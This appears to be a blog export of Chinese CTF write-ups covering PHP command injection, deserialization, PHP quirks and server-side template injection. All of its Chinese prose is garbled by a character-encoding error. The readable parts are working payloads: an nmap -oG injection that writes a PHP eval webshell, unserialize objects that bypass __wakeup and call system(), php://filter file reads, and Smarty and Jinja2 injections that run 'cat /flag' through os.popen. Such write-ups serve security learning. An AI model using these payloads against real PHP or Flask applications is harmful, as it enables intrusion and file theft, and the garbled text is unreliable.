æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š&amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A å’Œ \xFF*ã€‚ *â€™ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</code></pre><img src="/2023/08/03/buuctf/183949.png" class=""><p>ç„¶åå…·ä½“è¿™é“é¢˜çš„åˆ©ç”¨ç‚¹åœ¨nmapè¿™é‡Œï¼Œåœ¨nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶</p><pre><code>?host=&#39; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#39;</code></pre><p>æ³¨æ„äº‹é¡¹ï¼š</p><p><strong>ä¸¤è¾¹åŠ å•å¼•å·</strong>æ˜¯å› ä¸ºï¼Œä¸åŠ çš„è¯ï¼Œä¸¤ä¸ªå‡½æ•°æ‰§è¡Œåä¼šå˜æˆï¼š</p><pre><code>&#39;&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php&#39;</code></pre><p><strong>å¼•å·æ—è¾¹åŠ ç©ºæ ¼</strong>æ˜¯å› ä¸ºï¼Œå¦‚æœä¸åŠ ï¼Œå½“ä¸¤ä¸ªå‡½æ•°æ‰§è¡Œåå°±ä¼šç”Ÿæˆï¼š</p><pre><code>&#39;&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[&quot;hack&quot;\]\)\;\?\&gt; -oG hack.php&#39;\\&#39;&#39;&#39;</code></pre><p>æ³¨æ„ï¼šåœ¨bashä¸­ï¼Œå•å¼•å·æ˜¯å…¨å¼•ç”¨ï¼Œè¢«å•å¼•å·æ‹¬èµ·çš„å†…å®¹ä¸ç®¡æ˜¯å¸¸é‡è¿˜æ˜¯å˜é‡éƒ½ä¸ä¼šå‘ç”Ÿæ›¿æ¢ã€‚æ‰€ä»¥æœ€ç»ˆå°±ä¼šæ˜¯</p><pre><code>\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\</code></pre><h1 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h1><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h3><p>é¦–é¡µç»™å‡ºäº†æç¤ºï¼Œè¦æ‰¾å¤‡ä»½æ–‡ä»¶</p><p>å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€åï¼š.git .svn .swp .~ .bak .bash_history</p><p>ç”¨dirmapå¯ä»¥æ‰«å‡º<a href="http://www.zip,ä¸‹è½½ä¸‹æ¥åŒ…æ‹¬ä»¥ä¸‹æ–‡ä»¶index.php/">www.zipï¼Œä¸‹è½½ä¸‹æ¥åŒ…æ‹¬ä»¥ä¸‹æ–‡ä»¶index.php</a> flag.php index.js class.php style.css</p><p>index.phpä¸­æœ‰å…¥å£ï¼š</p><pre><code>include &#39;class.php&#39;;$select = $_GET[&#39;select&#39;];$res=unserialize(@$select);</code></pre><p>å¾ˆæ˜æ˜¾æ˜¯phpååºåˆ—åŒ–ï¼Œçœ‹class.phpï¼š</p><pre><code>class Name&#123;    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#39;guest&#39;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#39;admin&#39;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        &#125;    &#125;&#125;?&gt;</code></pre><p>åœ¨__destruct()ä¸­ï¼Œæˆ‘ä»¬éœ€è¦è®©passwordå¼±ç›¸ç­‰äº100ï¼Œè®©usernameç­‰äºadminæ‰èƒ½å¾—åˆ°flagï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ª__wakeup()é­”æœ¯æ–¹æ³•ï¼Œå®ƒåœ¨ååºåˆ—åŒ–æ—¶å…ˆæ‰§è¡Œï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™ä¸ªé­”æœ¯æ–¹æ³•</p><p><strong>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªCVEæ¼æ´ï¼šå½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡__wakeup()æ–¹æ³•</strong></p><p>æˆ‘ä»¬å…ˆç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡ï¼š</p><pre><code>&lt;?phpclass Name&#123;    private $username;    private $password;    public function __construct()&#123;        $this-&gt;username=&#39;admin&#39;;        $this-&gt;password=100;    &#125;&#125;echo serialize(new Name());?&gt;</code></pre><pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code></pre><p>å†å°†æˆå‘˜å±æ€§æ•°ç›®æ”¹æˆ3ï¼Œå¹¶ä¸”åœ¨ç§æœ‰å±æ€§ä¸­æ·»åŠ ä¸Š%00</p><pre><code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></pre><h3 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h3><p>ä»£ç å®¡è®¡ä¸€ä¸‹å‘ç°__destruct()é‡Œçš„$opä¸2æ˜¯å¼ºæ¯”è¾ƒï¼Œprocess()å‡½æ•°é‡Œçš„æ˜¯è‹¥æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥</p><p>å°†opå®ä¾‹åŒ–ä¸ºæ•°å­—2è¿›è¡Œç»•è¿‡ï¼Œç„¶åå°†filenameå®ä¾‹åŒ–ä¸ºâ€.&#x2F;flag.phpâ€ã€‚</p><p>ä½†æ˜¯è¿™é‡Œçš„å˜é‡å±æ€§æ˜¯protectedï¼Œåºåˆ—åŒ–åä¼šå‡ºç°%00ä¸å¯è§å­—ç¬¦ï¼Œé€šè¿‡ä¸äº†is_valid()å‡½æ•°</p><p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong>å› ä¸ºphp7.1ä»¥ä¸Šçš„ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæ‰€ä»¥å¯ä»¥å°†å±æ€§æ”¹ä¸ºpublicï¼Œpublicå±æ€§åºåˆ—åŒ–ä¸ä¼šå‡ºç°ä¸å¯è§å­—ç¬¦</p><pre><code>&lt;?phpclass FileHandler&#123;    public $op = &quot;2&quot;;    public $filename = &quot;./flag.php&quot;;&#125;echo urlencode(serialize(new FileHandler()));</code></pre><pre><code>payload:O%3A11%3A%22FileHandler%22%3A2%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3B%7D</code></pre><p>è¿˜å¯ä»¥ä½¿ç”¨ä¼ªåè®®ï¼š</p><pre><code>&lt;?phpclass FileHandler&#123;    public $op = 2;    public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;echo urlencode(serialize(new FileHandler()));</code></pre><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>ç¬¬ä¸€å±‚ç»•è¿‡ï¼š</p><pre><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code></pre><p>è¿™é‡Œå°±è¦ç”¨åˆ°ä¼ªåè®®ï¼Œphp:&#x2F;&#x2F;inputå’Œdataéƒ½å¯ä»¥</p><pre><code>?text=data://text/plain,welcome to the zjctf</code></pre><p>ç„¶åï¼š</p><pre><code>else&#123;        include($file);  //useless.php        $password = unserialize($password);        echo $password;    &#125;</code></pre><p>æ„æ€æ˜¯åœ¨useless.phpä¸­ååºåˆ—åŒ–</p><p>è¿™é‡Œå¯ä»¥ç”¨ä¼ªåè®®å»è¯»å–useless.php:</p><pre><code>?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>{ % asset_img 101403.png%}</p><p>åºåˆ—åŒ–ï¼š</p><pre><code>&lt;?phpclass Flag &#123;    public $file=&#39;flag.php&#39;;&#125;echo serialize(new Flag());</code></pre><p>æœ€ç»ˆpayloadï¼š</p><pre><code>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><h3 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h3><p>æ‰“å¼€åé¡µé¢ä¸€ç›´åœ¨é—ªï¼Œæ‰¾äº†ä¸€ä¸‹æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯ï¼ŒæŠ“åŒ…ï¼š</p><img src="/2023/08/03/buuctf/122234.png" class=""><p>è¿™é‡Œè‡ªåŠ¨æäº¤äº†ä¸¤ä¸ªå‚æ•°funcå’Œpï¼ŒçŒœæµ‹æºç é‡Œåº”è¯¥æœ‰call_user_func()å‡½æ•°ï¼Œç”¨file_get_contentsæµ‹è¯•ä¸€ä¸‹ï¼š</p><pre><code>func=file_get_contents&amp;p=index.php</code></pre><p>è¾“å‡ºäº†index.phpæºç ï¼š</p><p>{ % asset_img 122921.png%}</p><p>ä»£ç å®¡è®¡å‘ç°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–</p><p>åºåˆ—åŒ–ï¼š</p><pre><code>&lt;?phpclass Test&#123;    public $p=&quot;find / -name flag*&quot;;    public $func=&quot;system&quot;;&#125;echo serialize(new Test());//O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><p>ä¼ å‚åï¼š</p><img src="/2023/08/03/buuctf/132611.png" class=""><p>è¯»æ–‡ä»¶&#x2F;tmp&#x2F;flagoefiu4r93ï¼š</p><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><h1 id="phpç‰¹æ€§"><a href="#phpç‰¹æ€§" class="headerlink" title="phpç‰¹æ€§"></a>phpç‰¹æ€§</h1><h3 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h3><p>é¦–å…ˆå¯ä»¥åˆ©ç”¨phpä¼ªåè®®ç»•è¿‡åˆ¤æ–­å¹¶æŸ¥çœ‹é¢˜ç›®ä¸­æç¤ºçš„next.phpçš„æºç </p><pre><code>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</code></pre><img src="/2023/08/03/buuctf/210024.png" class=""><p>payload:</p><pre><code>/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&quot;ls&quot;);</code></pre><p>è¿™é‡Œçš„PHPç‰ˆæœ¬æ˜¯ï¼š<code>5.6.40</code>ï¼Œ<code>preg_replace()+/e</code>å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´</p><p>å…·ä½“å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.xinyueseo.com/websecurity/158.html">https://www.xinyueseo.com/websecurity/158.html</a></p><p><a href="https://www.cnblogs.com/sipc-love/p/14289984.html">https://www.cnblogs.com/sipc-love/p/14289984.html</a></p><h1 id="SSTIæ¨¡æ¿æ³¨å…¥"><a href="#SSTIæ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTIæ¨¡æ¿æ³¨å…¥"></a>SSTIæ¨¡æ¿æ³¨å…¥</h1><h3 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h3><p>æ‰“å¼€åæœ‰ä¸‰ä¸ªè¶…é“¾æ¥ï¼š</p><p>{ % asset_img 173958.png %}</p><p>å†…å®¹åˆ†åˆ«æ˜¯ï¼š</p><pre><code>flag in /fllllllllllllagrendermd5(cookie_secret+md5(filename))</code></pre><p>å½“æˆ‘ä»¬åˆ†åˆ«å»ç‚¹å‡»è¿™äº›é“¾æ¥çš„æ—¶å€™å‘ç°urlç»“æ„éƒ½ç›¸åŒï¼š</p><p>{ % asset_img 174339.png %}</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŒœåˆ°æˆ‘ä»¬æƒ³è¦çš„payloadåº”è¯¥æ˜¯&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;md5(cookie_secret+md5(â€œ&#x2F;fllllllllllllagâ€))</p><p>æ‰€ä»¥é—®é¢˜çš„å…³é”®æ˜¯è¿™ä¸ªcookie_secretï¼Œå»ç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‘ç°äº†ä¸€ç¯‡ç°æˆçš„æ–‡ç« ï¼š</p><p><a href="http://www.manongjc.com/detail/25-hjhhgdoihywitdw.html">http://www.manongjc.com/detail/25-hjhhgdoihywitdw.html</a></p><img src="/2023/08/03/buuctf/174845.png" class=""><p>å…¶å®è¿™é‡Œçš„**&#x2F;error?msg&#x3D;**æˆ‘ä»¬ç‚¹å‡»é“¾æ¥çš„æ—¶å€™éšä¾¿ç ´åä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°&#x2F;error?msg&#x3D;Errorï¼Œç„¶åæˆåŠŸå¾—åˆ°cookie_secret:</p><img src="/2023/08/03/buuctf/175722.png" class=""><p>æœ€åè¿›è¡Œmd5åŠ å¯†åå³å¯å¾—åˆ°filehash</p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>æºç ä¸­æœ‰â€œThe mystery of ipâ€,ä¸»é¡µå·¦ä¸Šè§’æœ‰Flagèœå•é€‰é¡¹ï¼Œç‚¹å‡»åå‘ç°ä¼šæ˜¾ç¤ºè‡ªå·±çš„ipï¼ŒHintèœå•çš„æºç ä¸­æç¤ºâ€œDo you know why i know your ip?â€ï¼Œè”æƒ³åˆ°X-Forward-Forï¼ŒæŠ“åŒ…ä¼ å‚ï¼š</p><img src="/2023/08/03/buuctf/172033.png" class=""><p>æœç„¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶XFF,ç„¶åä¸çŸ¥é“å¹²ä»€ä¹ˆï¼Œçœ‹åˆ«äººwpå‘ç°æ˜¯smartæ¨¡æ¿æ³¨å…¥ï¼Œæˆ‘ä»¬ç›´æ¥ä¼ å‚ï¼š</p><pre><code>&#123;system(&quot;ls&quot;)&#125;&#123;system(&quot;cat /flag&quot;)&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTIæ¨¡æ¿æ³¨å…¥</title>
      <link href="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>å¸¸è§çš„æ¨¡æ¿å¼•æ“æœ‰</p><pre><code>1.php å¸¸ç”¨çš„SmartySmartyç®—æ˜¯ä¸€ç§å¾ˆè€çš„PHPæ¨¡æ¿å¼•æ“äº†ï¼Œéå¸¸çš„ç»å…¸ï¼Œä½¿ç”¨çš„æ¯”è¾ƒå¹¿æ³›TwigTwigæ˜¯æ¥è‡ªäºSymfonyçš„æ¨¡æ¿å¼•æ“ï¼Œå®ƒéå¸¸æ˜“äºå®‰è£…å’Œä½¿ç”¨ã€‚å®ƒçš„æ“ä½œæœ‰ç‚¹åƒMustacheå’Œliquidã€‚BladeBlade æ˜¯ Laravel æä¾›çš„ä¸€ä¸ªæ—¢ç®€å•åˆå¼ºå¤§çš„æ¨¡æ¿å¼•æ“ã€‚å’Œå…¶ä»–æµè¡Œçš„ PHP æ¨¡æ¿å¼•æ“ä¸ä¸€æ ·ï¼ŒBlade å¹¶ä¸é™åˆ¶ä½ åœ¨è§†å›¾ä¸­ä½¿ç”¨åŸç”Ÿ PHPä»£ç ã€‚æ‰€æœ‰ Blade è§†å›¾æ–‡ä»¶éƒ½å°†è¢«ç¼–è¯‘æˆåŸç”Ÿçš„ PHP ä»£ç å¹¶ç¼“å­˜èµ·æ¥ï¼Œé™¤éå®ƒè¢«ä¿®æ”¹ï¼Œå¦åˆ™ä¸ä¼šé‡æ–°ç¼–è¯‘ï¼Œè¿™å°±æ„å‘³ç€ BladeåŸºæœ¬ä¸Šä¸ä¼šç»™ä½ çš„åº”ç”¨å¢åŠ ä»»ä½•é¢å¤–è´Ÿæ‹…ã€‚2.Java å¸¸ç”¨çš„JSPè¿™ä¸ªå¼•æ“æˆ‘æƒ³åº”è¯¥æ²¡äººä¸çŸ¥é“å§ï¼Œè¿™ä¸ªåº”è¯¥ä¹Ÿæ˜¯æˆ‘æœ€åˆå­¦ä¹ çš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œéå¸¸çš„ç»å…¸FreeMarkerFreeMarkeræ˜¯ä¸€æ¬¾æ¨¡æ¿å¼•æ“ï¼šå³ä¸€ç§åŸºäºæ¨¡æ¿å’Œè¦æ”¹å˜çš„æ•°æ®ï¼Œå¹¶ç”¨æ¥ç”Ÿæˆè¾“å‡ºæ–‡æœ¬ï¼ˆHTMLç½‘é¡µã€ç”µå­é‚®ä»¶ã€é…ç½®æ–‡ä»¶ã€æºä»£ç ç­‰ï¼‰çš„é€šç”¨å·¥å…·ã€‚å®ƒä¸æ˜¯é¢å‘æœ€ç»ˆç”¨æˆ·çš„ï¼Œè€Œæ˜¯ä¸€ä¸ªJavaç±»åº“ï¼Œæ˜¯ä¸€æ¬¾ç¨‹åºå‘˜å¯ä»¥åµŒå…¥ä»–ä»¬æ‰€å¼€å‘äº§å“çš„ç»„ä»¶ã€‚VelocityVelocityä½œä¸ºå†å²æ‚ ä¹…çš„æ¨¡æ¿å¼•æ“ä¸å•å•å¯ä»¥æ›¿ä»£JSPä½œä¸ºJavaWebçš„æœåŠ¡ç«¯ç½‘é¡µæ¨¡æ¿å¼•æ“ï¼Œè€Œä¸”å¯ä»¥ä½œä¸ºæ™®é€šæ–‡æœ¬çš„æ¨¡æ¿å¼•æ“æ¥å¢å¼ºæœåŠ¡ç«¯ç¨‹åºæ–‡æœ¬å¤„ç†èƒ½åŠ›ã€‚3.Python å¸¸ç”¨çš„Jinja2flask jinja2 ä¸€ç›´æ˜¯ä¸€èµ·è¯´çš„ï¼Œä½¿ç”¨éå¸¸çš„å¹¿æ³›ï¼Œæ˜¯æˆ‘å­¦ä¹ çš„ç¬¬ä¸€ä¸ªæ¨¡æ¿å¼•æ“djangodjango åº”è¯¥ä½¿ç”¨çš„æ˜¯ä¸“å±äºè‡ªå·±çš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œæˆ‘è¿™é‡Œå§‘ä¸”å°±å«ä»– djangoï¼Œæˆ‘ä»¬éƒ½çŸ¥é“django ä»¥å¿«é€Ÿå¼€å‘è‘—ç§°ï¼Œæœ‰è‡ªå·±å¥½ç”¨çš„ORMï¼Œä»–çš„å¾ˆå¤šä¸œè¥¿éƒ½æ˜¯è€¦åˆæ€§éå¸¸é«˜çš„ï¼Œä½ ä½¿ç”¨åˆ«çš„å°±ä¸èƒ½å‘æŒ¥å‡º django çš„ç‰¹æ€§äº†tornadotornado ä¹Ÿæœ‰å±äºè‡ªå·±çš„ä¸€å¥—æ¨¡æ¿å¼•æ“ï¼Œtornado å¼ºè°ƒçš„æ˜¯å¼‚æ­¥éé˜»å¡é«˜å¹¶å‘</code></pre><p>æ£€æµ‹åˆ°æ¨¡æ¿æ³¨å…¥åï¼Œæˆ‘ä»¬éœ€è¦åˆ¤æ–­å…·ä½“çš„æ¨¡æ¿å¼•æ“ï¼š</p><img src="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/888888.png" class=""><p>è¿™é‡Œçš„ç»¿çº¿è¡¨ç¤ºç»“æœæˆåŠŸè¿”å›ï¼Œçº¢çº¿åä¹‹ã€‚æœ‰äº›æ—¶å€™ï¼ŒåŒä¸€ä¸ªå¯æ‰§è¡Œçš„ payload ä¼šåœ¨ä¸åŒå¼•æ“ä¸­è¿”å›ä¸åŒçš„ç»“æœï¼Œæ¯”æ–¹è¯´49ä¼šåœ¨ Twig ä¸­è¿”å›49ï¼Œè€Œåœ¨ Jinja2 ä¸­åˆ™æ˜¯7777777ã€‚</p><h1 id="pythonä¸­çš„SSTI"><a href="#pythonä¸­çš„SSTI" class="headerlink" title="pythonä¸­çš„SSTI"></a>pythonä¸­çš„SSTI</h1><h3 id="jinjia2"><a href="#jinjia2" class="headerlink" title="jinjia2"></a>jinjia2</h3><p>flaskå¸¸ç”¨æ³¨å…¥æ¨¡å—ï¼š</p><img src="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/164120.png" class=""><p>æ¬ä¸€ä¸‹bfengjå¸ˆå‚…çš„ç¬”è®°ï¼š</p><pre><code>å¼•å¯¼ç±»ï¼š()/[]/&#39;&#39;/&quot;&quot;/&#123;&#125;/æ•°å­—/x(è¿™é‡Œçš„xä»»æ„26ä¸ªè‹±æ–‡å­—æ¯çš„ä»»æ„ç»„åˆéƒ½å¯ä»¥)    è™šç©ºç±»ï¼Œå¯ä»¥è¿™æ ·&#123;&#123;x.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;config               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;url_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__[&#39;__builtins__&#39;]å«æœ‰current_appã€‚get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”get_flashed_messages.__globals__[&#39;__builtins__&#39;]å«æœ‰current_appã€‚lipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;é­”æœ¯æ–¹æ³•ï¼š__class__            ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºç±»å‹çš„æ‰€å±å¯¹è±¡ã€‚__base__             ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±»ï¼ˆç›´æ¥çˆ¶ç±»ï¼‰__bases__            ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ __bases____mro__              æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾å…¨éƒ¨åŸºç±»åŠå½“å‰ç±»ã€‚__subclasses__()     è¿”å›å½“å‰ç±»çš„å­ç±»é›†åˆ__init__             åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯functionï¼ˆæŸ¥çœ‹ç±»æ˜¯å¦é‡è½½ï¼Œé‡è½½æ˜¯æŒ‡ç¨‹åºåœ¨è¿è¡Œæ—¶å°±å·²ç»åŠ è½½å¥½äº†è¿™ä¸ªç±»åˆ°å†…å­˜ä¸­ï¼Œå¦‚æœå‡ºç°wrapperå­—çœ¼ï¼Œè¯´æ˜æ²¡æœ‰é‡è½½ï¼‰__globals__          ä½¿ç”¨æ–¹å¼æ˜¯ functionå.__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚__dic__              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ__getattribute__()   å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼ša.xxx/a.xxx()ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚__getitem__()        è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a[&#39;b&#39;]ï¼Œå°±æ˜¯a.__getitem__(&#39;b&#39;)æ³¨ï¼š__getitem__()ä¹Ÿå¯ä»¥ç”¨get()æ¥ä»£æ›¿__builtins__         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚__import__           åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]__str__()            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚current_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚g         